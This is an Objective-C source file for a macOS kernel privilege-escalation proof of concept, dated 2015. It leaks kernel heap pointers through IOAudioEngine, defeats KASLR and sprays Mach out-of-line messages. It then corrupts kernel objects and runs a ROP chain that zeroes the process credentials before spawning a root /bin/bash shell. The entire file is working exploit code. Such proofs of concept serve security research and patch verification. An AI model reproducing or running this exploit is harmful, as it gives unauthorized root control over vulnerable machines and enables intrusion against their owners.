//
//  main.m
//  poc-1
//
//  Created by jndok on 15/11/15.
//  Copyright © 2015 jndok. All rights reserved.
//

#import <Foundation/Foundation.h>

#include <sys/mman.h>
#include <sys/stat.h>

#include "ropnroll.h"
#include "pwn.h"

io_service_t audio = MACH_PORT_NULL;
io_service_t hdix = MACH_PORT_NULL;

typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;

__attribute__((always_inline)) static inline
void send_kern_data(char* vz, size_t svz, mach_port_t* msgp) {
    oolmsg_t *msg=calloc(sizeof(oolmsg_t)+0x2000,1);
    if(!*msgp){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, msgp);
        mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
    }
    bzero(msg,sizeof(oolmsg_t));
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_remote_port = *msgp;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    msg->desc.address = (void *)vz;
    msg->desc.size = svz;
    msg->desc.type = MACH_MSG_OOL_DESCRIPTOR;
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    free(msg);
}
__attribute__((always_inline)) static inline
char* read_kern_data(mach_port_t port) {
    oolmsg_t *msg=calloc(sizeof(oolmsg_t)+0x2000,1);
    bzero(msg,sizeof(oolmsg_t)+0x2000);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, (port), 0, MACH_PORT_NULL);
    return msg->desc.address;
}

void init_services(void) {
    io_iterator_t iter;
    
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOAudioEngine"), &iter);
    audio=IOIteratorNext(iter);
    
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHDIXController"), &iter);
    hdix=IOIteratorNext(iter);
}

mapping_t *map_file(const char *path)
{
    int fd = open(path, O_RDONLY);
    struct stat st;
    fstat(fd, &st);
    mapping_t *r = malloc(sizeof(mapping_t));
    r->map = mmap((void*)0x0, (size_t)st.st_size, PROT_READ, MAP_SHARED, fd, 0x0);
    r->map_size=(size_t)st.st_size;
    
    return r;
}

int main(int argc, const char * argv[]) {
    
    init_services();
    
    struct kernel_object {
        io_connect_t conn;
        uint64_t ptr;
        mach_port_t port;
    };
    
#define MAX_ALLOCS PAGE_SIZE
    
    struct kernel_object kos[4096];
    io_connect_t conns[10];
    mach_port_t ports[256];
    int found=0;
    
    mapping_t *map = map_file("/System/Library/Extensions/IOAudioFamily.kext/Contents/MacOS/IOAudioFamily");
    mapping_t *kmap = map_file("/System/Library/Kernels/kernel");
    uint64_t unslid = kext_base_address("com.apple.iokit.IOAudioFamily") + locate_symbol_in_map(map, "__ZTV23IOAudioEngineUserClient") + 0x10;
    
    char *vz=(char*)malloc(1500);
    
    while ((kos[0].ptr = io_audio_engine_infoleak(&(kos[0].conn)))) {
        if ((kos[0].ptr & 0xfff) != 0xc00) {
            for (int i=0; i<10; ++i) {
                kos[1].ptr = io_audio_engine_infoleak(&(kos[1].conn));
                if (kos[1].ptr == kos[0].ptr+1024) {
                    found=1;
                    break;
                }
                
                conns[i]=kos[1].conn;
                kos[1].conn=0x0;
            }
            
            if (found) {
                break;
            } else {
                for (int i=0; i<10; ++i) {
                    conns[i]=0x0;
                }
            }
        }
    }
    
done:;
    printf("done! %#llx -- %#llx\n", kos[0].ptr, kos[1].ptr);
    
    IOServiceClose(kos[0].conn);
    
    for (int x=0; x<256; ++x) {
        send_kern_data(vz, 1024-0x58, &ports[x]);
    }
    
    or_primitive(kos[0].ptr + 16);
    or_primitive(kos[0].ptr + 500);
    
    uint64_t slid=0;
    
    found=0;
    for (int x=0; x<256; ++x) {
        char *d = read_kern_data(ports[x]);
        slid = (*(uint64_t*)((1024-0x58+(char*)d)));
        if (slid) {
            printf("slid: %#llx\n", slid);
            break;
        }
    }
    
    uint64_t kslide=slid-unslid;
    printf("%#llx\n", kslide);
    
    fake_stack_t *stack = malloc(sizeof(fake_stack_t));
    bzero(stack->chain, 0x1000);
    

    //
    // *  This part is quite messy. I should use macros lol
    // *  A big thanks especially for the ropchain to qwertyoruiop,
    // *  since I have absolutely no idea how to write one, kek.
    //
    
    stack->chain[0] = slide_kernel_pointer((POP_RDI(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[1] = kos[1].ptr+0x208;
    
    stack->chain[2] = slide_kernel_pointer((POP_RSI(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[3] = sizeof(uint64_t);
    
    stack->chain[4] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_bzero"), kslide);
    
    //
    
    stack->chain[5] = slide_kernel_pointer((POP_RDI(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[6] = kos[1].ptr+0x220;
    
    stack->chain[7] = slide_kernel_pointer((POP_RSI(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[8] = 1;
    
    stack->chain[9] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_bzero"), kslide);
    
    //
    
    stack->chain[10] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_current_proc"), kslide);
    
    stack->chain[11] = slide_kernel_pointer((POP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[12] = slide_kernel_pointer((NULL_OP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[13] = slide_kernel_pointer((RAX_TO_RDI_POP_RBP_JMP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[14] = 0xdeadbeefdeadbeef;
    
    stack->chain[15] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_proc_ucred"), kslide);
    
    stack->chain[16] = slide_kernel_pointer((POP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[17] = slide_kernel_pointer((NULL_OP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[18] = slide_kernel_pointer((RAX_TO_RDI_POP_RBP_JMP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[19] = 0xdeadbeefdeadbeef;

    stack->chain[20] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_posix_cred_get"), kslide);
    
    stack->chain[21] = slide_kernel_pointer((POP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[22] = slide_kernel_pointer((NULL_OP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[23] = slide_kernel_pointer((RAX_TO_RDI_POP_RBP_JMP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[24] = 0xdeadbeefdeadbeef;
    
    stack->chain[25] = slide_kernel_pointer((POP_RSI(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[26] = sizeof(int)*3;
    
    stack->chain[27] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_bzero"), kslide);
    
    //
    
    stack->chain[28] = slide_kernel_pointer((POP_RDI(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[29] = (uid_t)getuid();
    
    stack->chain[30] = slide_kernel_pointer((POP_RSI(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[31] = (int)-1;
    
    stack->chain[32] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_chgproccnt"), kslide);
    
    //
    
    stack->chain[33] = slide_kernel_pointer((POP_RAX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[34] = kos[1].ptr+0x210;
    
    stack->chain[35] = slide_kernel_pointer((READ_RAX_TO_RAX_POP_RBP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[36] = 0xdeadbeefdeadbeef;
    
    //
    
    stack->chain[37] = slide_kernel_pointer((POP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[38] = slide_kernel_pointer((NULL_OP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[39] = slide_kernel_pointer((RAX_TO_RDI_POP_RBP_JMP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[40] = 0xdeadbeefdeadbeef;
    
    stack->chain[41] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_IORecursiveLockUnlock"), kslide);
    
    stack->chain[42] = slide_kernel_pointer((POP_RAX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[43] = kos[1].ptr+0xe0;
    
    //
    
    stack->chain[44] = slide_kernel_pointer((READ_RAX_TO_RAX_POP_RBP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[45] = 0xdeadbeefdeadbeef;
    
    stack->chain[46] = slide_kernel_pointer((POP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[47] = slide_kernel_pointer((NULL_OP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[48] = slide_kernel_pointer((RAX_TO_RDI_POP_RBP_JMP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[49] = 0xdeadbeefdeadbeef;
    
    stack->chain[50] = slide_kernel_pointer(locate_symbol_in_map(kmap, "__ZN10IOWorkLoop8openGateEv"), kslide);
    
    stack->chain[51] = slide_kernel_pointer((POP_RAX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[52] = kos[1].ptr+0xe8;
    
    stack->chain[53] = slide_kernel_pointer((READ_RAX_TO_RAX_POP_RBP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[54] = 0xdeadbeefdeadbeef;
    
    stack->chain[55] = slide_kernel_pointer((POP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[56] = slide_kernel_pointer((NULL_OP(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[57] = slide_kernel_pointer((RAX_TO_RDI_POP_RBP_JMP_RCX(kmap)+locate_kernel_text(kmap)), kslide);
    stack->chain[58] = 0xdeadbeefdeadbeef;
    
    stack->chain[59] = slide_kernel_pointer(locate_symbol_in_map(kmap, "__ZN13IOEventSource8openGateEv"), kslide);
    
    stack->chain[60] = slide_kernel_pointer(locate_symbol_in_map(kmap, "_thread_exception_return"), kslide);

    uint64_t* vtable=malloc(0x1000);
    
    vtable[0] = 0;
    vtable[1] = 0;
    vtable[2] = 0;
    vtable[3] = slide_kernel_pointer((POP_RAX(kmap)+locate_kernel_text(kmap)), kslide);
    vtable[4] = slide_kernel_pointer((PIVOT_RAX(kmap)+locate_kernel_text(kmap)), kslide);
    vtable[5] = slide_kernel_pointer((POP_RAX(kmap)+locate_kernel_text(kmap)), kslide);
    vtable[6] = 0;
    vtable[7] = slide_kernel_pointer((POP_RSP(kmap)+locate_kernel_text(kmap)), kslide);
    vtable[8] = (uint64_t)stack->chain;
    
    or_primitive(kos[1].ptr+0x220);
    or_primitive(kos[1].ptr+0x208);
    
    alloc_null(0x1000);
    
    volatile uint64_t* ptr = (uint64_t*) 0x10;
    
    ptr[0] = (uint64_t)0;
    ptr[1] = (uint64_t)vtable;
    ptr[2] = (uint64_t)&ptr[1];
    IOConnectRelease(kos[1].conn);
    
    setuid(0);
    system("/bin/bash");
    
    return 0;
}
